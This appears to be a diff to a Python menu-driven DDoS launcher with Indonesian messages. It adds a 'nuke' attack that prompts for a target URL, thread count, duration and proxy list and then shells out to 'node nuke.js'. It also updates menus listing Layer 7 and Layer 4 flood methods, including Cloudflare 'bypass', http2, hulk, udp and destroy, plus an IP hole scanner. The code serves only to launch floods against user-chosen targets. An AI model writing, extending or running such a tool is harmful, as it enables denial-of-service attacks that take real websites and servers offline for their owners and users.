@@ -341,6 +341,18 @@ def get_info_l7c():
     stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)                      "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
     t = input()
     return target, port, methode, t
+    
+def get_info_l7d():
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL      "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
+    target = input()
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
+    thread = input()
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
+    t = input()
+    stdout.write("\x1b[38;2;255;20;147m"+Fore.WHITE+"PROXY OPTION"+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX+"type proxy.txt or proxy2.txt \n"+Fore.LIGHTGREEN_EX)
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PROXY    "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
+    prox = input()
+    return target, thread, t, prox
 
 def get_info_l4():
     stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP       "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
@@ -1180,14 +1192,14 @@ def help():
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"╔═════════╩═══════════════════════╩═════════╗\n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"l7     "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show Layer7 Methods "+Fore.LIGHTGREEN_EX+"           ║\n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"l4     "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show Layer4 Methods "+Fore.LIGHTGREEN_EX+"           ║\n")
-    stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"special"+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show Special Methods"+Fore.LIGHTGREEN_EX+"           ║\n")
+    stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"l5     "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show Special Methods"+Fore.LIGHTGREEN_EX+"           ║\n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tools  "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show tools          "+Fore.LIGHTGREEN_EX+"           ║\n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"func   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show function       "+Fore.LIGHTGREEN_EX+"           ║\n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"credit "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show credit         "+Fore.LIGHTGREEN_EX+"           ║\n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"exit   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Exit                "+Fore.LIGHTGREEN_EX+"           ║\n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"╠═══════════════════════════════════════════╣\n")
-    stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"THANK " +Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+"                    "+Fore.LIGHTGREEN_EX+"             ║\n")
-    stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"YOU♥  " +Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+"                    "+Fore.LIGHTGREEN_EX+"             ║\n")
+    stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"THANK " +Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+"unknown mod         "+Fore.LIGHTGREEN_EX+"             ║\n")
+    stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"YOU♥  " +Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+"unknown mod         "+Fore.LIGHTGREEN_EX+"             ║\n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"╚═══════════════════════════════════════════╝\n")
     stdout.write("\n")
 
@@ -1212,9 +1224,9 @@ def credit():
     clear()
     picture()
     stdout.write("\x1b[38;2;0;236;250m════════════════════════╗\n")
-    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Modified"+Fore.RED+": \x1b[38;2;0;255;189m UNKNOWN      \n")
-    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Edited"+Fore.RED+"  : \x1b[38;2;0;255;189m UNKNOWN      \n")
-    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Changed"+Fore.RED+" : \x1b[38;2;0;255;189m UNKNOWN      \n")
+    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Modified"+Fore.RED+": \x1b[38;2;0;255;189m UNKNOWN  \n")
+    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Edited"+Fore.RED+"  : \x1b[38;2;0;255;189m UNKNOWN  \n")
+    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Changed"+Fore.RED+" : \x1b[38;2;0;255;189m UNKNOWN  \n")
     stdout.write("\x1b[38;2;0;236;250m════════════════════════╝\n")
     stdout.write("\n")
 ##############################################################################################
@@ -1238,19 +1250,17 @@ def layer7():
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"╔═══════════╩════════════════════════════════════╩═════════╗\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m    "+Fore.LIGHTWHITE_EX+"             LAYER 7 COMMAND"+Fore.LIGHTGREEN_EX+" ~~ "+Fore.LIGHTWHITE_EX+"LIST                 "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║══════════════════════════════════════════════════════════║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfb    "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" tlz                                      "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxcfb  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" ovh-beam                                 "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfpro  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" stellar                                  "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfsoc  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" pxslow                                   "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"bypass "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" pxsoc                                    "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"attack "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" pxraw                                    "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"http2  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" pxhulk                                   "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"strike "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" hulk                                     "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfb    "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+"•   tlz                                   "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxcfb  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+"•   ovh-beam                              "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfpro  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+"•   stellar                               "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfsoc  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+"•   pxslow                                "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"bypass "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+"•   pxsoc                                 "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"attack "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+"•   pxraw                                 "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"http2  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+"•   pxhulk                                "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"strike "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+"•   hulk                                  "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"get    "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+"                                          "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"post   "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" spoof                                    "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"head   "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" soc                                      "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"       "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+"                                          "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"       "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+"                                          "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"post   "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+"•   spoof                                 "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"head   "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+"•   soc                                   "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"╚══════════════════════════════════════════════════════════╝\n")
     stdout.write("\n")
 ##############################################################################################
@@ -1266,15 +1276,17 @@ def layer4():
 #    stdout.write(" "+Fore.LIGHTWHITE_EX  +"██║  ██║██║  ██║██║    ██████╔╝██████╔╝╚██████╔╝███████║ \n")
 #    stdout.write(" "+Fore.LIGHTWHITE_EX  +"╚═╝  ╚═╝╚═╝  ╚═╝╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ \n")
     stdout.write("                                                                                  \n")
-    stdout.write(" "+Fore.LIGHTWHITE_EX  +"   ██╗      █████╗ ██╗   ██╗███████╗██████╗ ██╗  ██╗ \n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"   ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗██║  ██║ \n")
-    stdout.write(" "+Fore.GREEN          +"   ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝███████║ \n")
-    stdout.write(" "+Fore.BLUE           +"   ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗╚════██║ \n")
-    stdout.write(" "+Fore.LIGHTBLUE_EX   +"   ███████╗██║  ██║   ██║   ███████╗██║  ██║     ██║ \n")
-    stdout.write(" "+Fore.LIGHTBLUE_EX   +"   ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝     ╚═╝ \n")
+    stdout.write(" "+Fore.LIGHTWHITE_EX  +" ██╗      █████╗ ██╗   ██╗███████╗██████╗ ██╗  ██╗ \n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +" ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗██║  ██║ \n")
+    stdout.write(" "+Fore.GREEN          +" ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝███████║ \n")
+    stdout.write(" "+Fore.BLUE           +" ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗╚════██║ \n")
+    stdout.write(" "+Fore.LIGHTBLUE_EX   +" ███████╗██║  ██║   ██║   ███████╗██║  ██║     ██║ \n")
+    stdout.write(" "+Fore.LIGHTBLUE_EX   +" ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝     ╚═╝ \n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"        ══╦══════════════════════════════╦══\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"╔═════════╩══════════════════════════════╩═════════╗\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"udp    "+Fore.LIGHTGREEN_EX+"           ║"+Fore.LIGHTWHITE_EX+" destroy                    "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m  "+Fore.LIGHTWHITE_EX+"            LAYER 4 COMMAND"+Fore.LIGHTGREEN_EX+" ~~ "+Fore.LIGHTWHITE_EX+"LIST            "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║══════════════════════════════════════════════════║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"udp    "+Fore.LIGHTGREEN_EX+"           ║"+Fore.LIGHTWHITE_EX+"• destroy                   "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tcp    "+Fore.LIGHTGREEN_EX+"           ║"+Fore.LIGHTWHITE_EX+"                            "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"mine   "+Fore.LIGHTGREEN_EX+"           ║"+Fore.LIGHTWHITE_EX+"                            "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"samp   "+Fore.LIGHTGREEN_EX+"           ║"+Fore.LIGHTWHITE_EX+"                            "+Fore.LIGHTGREEN_EX+"║\n")
@@ -1294,14 +1306,12 @@ def layer5():
     stdout.write(" "+Fore.BLUE           +"   ╚════██║██╔═══╝ ██╔══╝  ██║     ██║██╔══██║██║     ╚════██║   \n")
     stdout.write(" "+Fore.LIGHTBLUE_EX   +"   ███████║██║     ███████╗╚██████╗██║██║  ██║███████╗███████║   \n")
     stdout.write(" "+Fore.LIGHTBLUE_EX   +"   ╚══════╝╚═╝     ╚══════╝ ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝╚══════╝   \n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"        ══╦══════════════════════════════╦══\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"╔═════════╩══════════════════════════════╩═════════╗\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"nuke   "+Fore.LIGHTGREEN_EX+"           ║"+Fore.LIGHTWHITE_EX+"                            "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"       "+Fore.LIGHTGREEN_EX+"           ║"+Fore.LIGHTWHITE_EX+"                            "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"       "+Fore.LIGHTGREEN_EX+"           ║"+Fore.LIGHTWHITE_EX+"                            "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"       "+Fore.LIGHTGREEN_EX+"           ║"+Fore.LIGHTWHITE_EX+"                            "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"       "+Fore.LIGHTGREEN_EX+"           ║"+Fore.LIGHTWHITE_EX+"                            "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"╚══════════════════════════════════════════════════╝\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"              ══╦═══════════════════════════════╦══\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"      ╔═════════╩═══════════════════════════════╩═════════╗\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"      ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"nuke   "+Fore.LIGHTGREEN_EX+"           ║"+Fore.LIGHTWHITE_EX+"                             "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"      ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"stress "+Fore.LIGHTGREEN_EX+"           ║"+Fore.LIGHTWHITE_EX+"                             "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"      ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"       "+Fore.LIGHTGREEN_EX+"           ║"+Fore.LIGHTWHITE_EX+"                             "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"      ╚═══════════════════════════════════════════════════╝\n")
     stdout.write("\n")
 
 ##############################################################################################
@@ -1327,7 +1337,7 @@ def tools():
     stdout.write(" "+Fore.LIGHTGREEN_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"geoip  "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" pencari Geo IP          "+Fore.LIGHTGREEN_EX+"           ║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"dns    "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Classic DNS Lookup      "+Fore.LIGHTGREEN_EX+"           ║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"subnet "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Subnet IP Address Lookup"+Fore.LIGHTGREEN_EX+"           ║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"scan-ip"+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Nyari bolongan          "+Fore.LIGHTGREEN_EX+"           ║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"scan   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Nyari bolongan          "+Fore.LIGHTGREEN_EX+"           ║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX +"  ╚═══════════════════════════════════════════════╝\n")
     stdout.write("\n")
 
@@ -1529,14 +1539,14 @@ def command():
         timer.start()
         timer.join()
     elif command == "nuke":
-        target, thread, t = get_info_l7()
-        picture()
+        target, thread, t, prox = get_info_l7d()
         try:
-            os.system(f'node nuke.js {target} {t} 32 {thread} proxy.txt')
+            os.system(f'node nuke.js {target} {t} 32 {thread} {prox}')
         except IndexError:
             print('ISI YANG BENER DONG AH...')
     elif command == "ovh-beam":
         target, port, methode, t = get_info_l7c()
+        picture()
         try:
             os.system(f'sh OVH-BEAM {methode} {target} {port} {t} 1024')
         except IndexError:
@@ -1579,6 +1589,7 @@ def command():
         timer.join() 
     elif command == "destroy":
         target, port, thread, t = get_info_l4()
+        picture()
         try:
             os.system(f'perl destroy.pl {target} {port} 65500 {t}')
         except IndexError:
@@ -1621,7 +1632,7 @@ def command():
         except:
             print('Error cuy pas lagi req ke API!!')
             
-    elif command == "scan-ip" :
+    elif command == "scan" :
         stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
         target = input()
         try :
